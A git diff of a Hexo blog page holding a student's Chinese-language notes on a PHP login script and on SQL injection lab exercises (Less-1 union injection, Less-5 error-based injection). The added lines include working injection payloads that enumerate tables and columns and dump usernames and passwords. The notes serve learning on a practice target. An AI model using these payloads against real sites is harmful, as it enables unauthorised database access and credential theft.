@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"php","path":"2025/10/05/php/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"}]`)
+  const posts = JSON.parse(`[{"title":"How to build up a blog site using Hexo and Guithub Pages","path":"2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/"},{"title":"VScode","path":"2025/09/19/VScode/"},{"title":"sql","path":"2025/10/10/sql/"},{"title":"php","path":"2025/10/05/php/"},{"title":"web任务","path":"2025/10/04/web任务/"},{"title":"虚拟机搭建","path":"2024/09/15/虚拟机搭建/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -335,7 +335,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>7018天</span>
+        <span>7030天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -390,7 +390,7 @@
 
 <h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>题目：</p>
 <p><img src="https://github.com/Lin060807/images/raw/main/php.png" alt="php"></p>
-<p>通过require’db.php’引入数据库连接文件<br>PHP_saqi_name()&#x3D;&#x3D;&#x3D;’cli’:获取PHP的服务器应用程序编程接口类型，判断是否是命令行模式<br>fgets(SIDIN)：从命令行获取用户输入的内容<br>trim（）：用于去除首尾空白字符<br>可以得到用户名和密码<br>在web模式下，用$_post获取post提交的数据表单<br>？？‘’是空合并运算符，当$_post[]不存在时设为空<br>检查输入部分：判断用户名和密码是否为空<br>查询数据库：构建sql查询语句，从users表中查询用户名和密码是否一致<br>query($sql):执行并返回sql查询语句结果集<br>$conn:从db.php中引入数据库连接对象<br>如果$result为真并且结果中的记录数量大于零，则登录成功，否则失败<br>关闭数据库连接</p>
+<p>通过require’db.php’引入数据库连接文件<br>PHP_saqi_name()&#x3D;&#x3D;&#x3D;’cli’:获取PHP的服务器应用程序编程接口类型，判断是否是命令行模式<br>fgets(STDIN)：从命令行获取用户输入的内容<br>trim（）：用于去除首尾空白字符<br>可以得到用户名和密码<br>在web模式下，用$_post获取post提交的数据表单<br>？？‘’是空合并运算符，当$_post[]不存在时设为空<br>检查输入部分：判断用户名和密码是否为空<br>查询数据库：构建sql查询语句，从users表中查询用户名和密码是否一致<br>query($sql):执行并返回sql查询语句结果集<br>$conn:从db.php中引入数据库连接对象<br>如果$result为真并且结果中的记录数量大于零，则登录成功，否则失败<br>关闭数据库连接</p>
 <p><img src="https://github.com/Lin060807/images/raw/main/db.png" alt="db"><br>db.php<br>创建了名为test的数据库<br>选择test数据库<br>创建名为users的表，包含了id，username，password（最大长度为50的字符串）<br>插入测试数据：<br>   1.用户名alice，密码12345<br>   2.用户名bob，密码abcde</p>
 <h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h2 id="Less-1（union注入）"><a href="#Less-1（union注入）" class="headerlink" title="Less-1（union注入）"></a>Less-1（union注入）</h2><p>题目：</p>
 <p><img src="https://github.com/Lin060807/images/raw/main/Less-1.png" alt="Less-1"></p>
@@ -398,7 +398,7 @@
 <pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="operator">/</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure>
  
 </code></pre>
-<p>3.如果是字符型，找他的闭合方式（‘“&#x2F;–+可以注释掉后面的部分）<br>4.判断查询列数</p>
+<p>3.如果是字符型，找他的闭合方式（’’’&#x2F;–+&#x2F;#可以注释掉后面的部分）<br>4.判断查询列数</p>
 <pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="keyword">by</span><span class="operator">/</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
  
 </code></pre>
@@ -409,12 +409,11 @@
 <p>6.查表名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat（table_name）,3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
 <p>7.查列名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat（column_name）,3 from information_schema.columns where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
 
 <ol start="8">
-<li></li>
+<li>group_concat(所需列名)  from 所需表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,password),3 from users --+</span></span><br></pre></td></tr></table></figure></li>
 </ol>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(所显示的列名),3 from 所需要的表名</span></span><br></pre></td></tr></table></figure>
 <h2 id="Less-5（报错注入）"><a href="#Less-5（报错注入）" class="headerlink" title="Less-5（报错注入）"></a>Less-5（报错注入）</h2><p>原因：后台对于输入输出的合理性没有做检查，导致返回报错中包含数据库中的内容<br><img src="https://github.com/Lin060807/images/raw/main/Less-5.png" alt="Less-5"></p>
 <p>通过添加“～”让其报错<br>查询表</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,extractValue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span></span><br></pre></td></tr></table></figure>
